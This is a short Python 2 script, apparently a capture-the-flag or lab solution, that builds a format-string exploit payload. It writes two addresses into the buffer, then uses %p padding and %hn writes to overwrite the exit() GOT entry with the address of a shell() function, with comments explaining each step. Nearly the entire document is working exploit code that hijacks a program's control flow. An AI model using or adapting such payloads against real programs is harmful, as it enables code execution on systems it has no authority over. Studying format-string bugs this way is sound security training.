#!/usr/bin/python
from struct import pack

shell = 0x80484eb
exit = 0x804a01c
exit_high = 0x804a01c + 2

buffer = pack("<L", exit_high) # overwrite the first part of exit()
buffer += pack("<L", exit) # overwrite the second part of exit()

count = 0x804 - len(buffer) # The first 2 bytes of shell()

buffer += "%" + str(count) + "p"
buffer += "%4$hn" # 4th arg, use "hn" to WRITE these bytes to memory

count = 0x84eb - 0x804 # The last 2 bytes of shell()

buffer += "%" + str(count) + "p"
buffer += "%5$hn" # placed in 5th arg

print buffer